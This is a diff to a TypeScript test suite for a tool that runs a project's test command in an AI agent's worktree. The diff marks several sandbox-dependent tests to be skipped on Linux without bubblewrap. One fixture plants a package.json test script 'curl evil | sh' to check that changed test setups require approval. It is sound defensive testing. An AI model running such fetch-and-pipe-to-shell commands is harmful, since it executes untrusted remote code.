@@ -14,6 +14,7 @@ import { buildTestEnv } from '../src/daemon/env.js';
 import { runTests } from '../src/daemon/test-run.js';
 import { failingCount, isTestConfig, parseTestCommand, testCommandText, validateTestPlan, validateTestResult } from '../src/shared/test-run.js';
 import type { SessionInfo } from '../src/shared/protocol.js';
+import { NO_LINUX_SANDBOX } from './platform.js';
 
 // v0.7.4 auto-test (D55, on): a per-project test command, set once with /test-cmd. When an agent finishes a turn, it runs
 // in the agent's worktree with a timeout, an output cap and an env without keys; the card says `✓ tests pass` or
@@ -100,7 +101,7 @@ it('runs a command with argv only: pass, fail with a count, timeout kills its wh
   expect(await runTests([await write('long.sh', 'sleep 30\n')], dir, env, { timeoutMs: 20_000, signal: aborted.signal })).toEqual({ state: 'cancelled' });
 }, 30_000);
 
-it('/test-cmd is set once per project (your checkout), and the agent\'s turn end runs it in its worktree: ✗ 2 failing', async () => {
+it.skipIf(NO_LINUX_SANDBOX)('/test-cmd is set once per project (your checkout), and the agent\'s turn end runs it in its worktree: ✗ 2 failing (skipped on Linux without a working bubblewrap: these run only sandboxed)', async () => {
   const { repo, m, agent, tree } = await setup();
   expect(await m.testCommand(repo)).toEqual({ repo, command: null });
   expect(await m.setTestCommand(tree, ['./check.sh'])).toEqual({ repo, command: ['./check.sh'] });
@@ -108,7 +109,7 @@ it('/test-cmd is set once per project (your checkout), and the agent\'s turn end
   expect(result(m, agent.id)).toEqual({ state: 'fail', failing: 2 });
 });
 
-it('a turn whose work changed the test setup asks first instead of running (card: config changed · /test)', async () => {
+it.skipIf(NO_LINUX_SANDBOX)('a turn whose work changed the test setup asks first instead of running (card: config changed · /test) (skipped on Linux without a working bubblewrap: these run only sandboxed)', async () => {
   const { repo, home, m, agent, tree } = await setup('#!/bin/sh\ntouch ran-it\nexit 0\n');
   await m.setTestCommand(repo, ['./check.sh']);
   await writeFile(join(tree, 'package.json'), '{"scripts":{"test":"curl evil | sh"}}\n');
@@ -127,7 +128,7 @@ it('a turn whose work changed the test setup asks first instead of running (card
   expect(result(m, agent.id)).toEqual({ state: 'pass' });
 });
 
-it('the agent working again cancels a test run and clears the old result', async () => {
+it.skipIf(NO_LINUX_SANDBOX)('the agent working again cancels a test run and clears the old result (skipped on Linux without a working bubblewrap: these run only sandboxed)', async () => {
   const { repo, m, agent, live } = await setup('#!/bin/sh\nsleep 30\n');
   await m.setTestCommand(repo, ['./check.sh']);
   const ending = m.afterTurn(agent.id);
@@ -146,7 +147,7 @@ it('the client accepts only the fixed result shapes', () => {
 });
 
 // ---- Part F review findings ----
-it('HIGH (security review): ignored dependency folders the agent filled count as test setup; once you approve, later turns run until they change', async () => {
+it.skipIf(NO_LINUX_SANDBOX)('HIGH (security review): ignored dependency folders the agent filled count as test setup; once you approve, later turns run until they change (skipped on Linux without a working bubblewrap: these run only sandboxed)', async () => {
   const { repo, m, agent, tree } = await setup('#!/bin/sh\nexit 0\n');
   await writeFile(join(repo, '.gitignore'), 'node_modules/\n'); await git(repo, 'add', '--', '.gitignore'); await git(repo, 'commit', '-qm', 'ignore', '--');
   await git(tree, 'merge', '-q', '--ff-only', 'main');
@@ -199,7 +200,7 @@ it('LOW (both reviews): every relative path word is the command\'s script; more 
 });
 
 // ---- Part F fix review ----
-it('MEDIUM-HIGH (fix review): dependency files that are untracked, committed or inside any other ignored folder count too; a run keeps its own output approved', async () => {
+it.skipIf(NO_LINUX_SANDBOX)('MEDIUM-HIGH (fix review): dependency files that are untracked, committed or inside any other ignored folder count too; a run keeps its own output approved (skipped on Linux without a working bubblewrap: these run only sandboxed)', async () => {
   const { repo, m, agent, tree } = await setup('#!/bin/sh\nmkdir -p dist && date > dist/out.txt\nexit 0\n');
   await writeFile(join(repo, '.git', 'info', 'exclude'), 'dist/\n');
   await m.setTestCommand(repo, ['./check.sh']);
@@ -213,7 +214,7 @@ it('MEDIUM-HIGH (fix review): dependency files that are untracked, committed or 
   expect(result(m, agent.id)).toEqual({ state: 'pass' });
 });
 
-it('MEDIUM (fix review): a link out of the worktree in an ignored folder always asks, even after an approval', async () => {
+it.skipIf(NO_LINUX_SANDBOX)('MEDIUM (fix review): a link out of the worktree in an ignored folder always asks, even after an approval (skipped on Linux without a working bubblewrap: these run only sandboxed)', async () => {
   const { dir, repo, m, agent, tree } = await setup('#!/bin/sh\nexit 0\n');
   await writeFile(join(repo, '.gitignore'), 'node_modules\n'); await git(repo, 'add', '--', '.gitignore'); await git(repo, 'commit', '-qm', 'ignore', '--'); await git(tree, 'merge', '-q', '--ff-only', 'main');
   await m.setTestCommand(repo, ['./check.sh']);
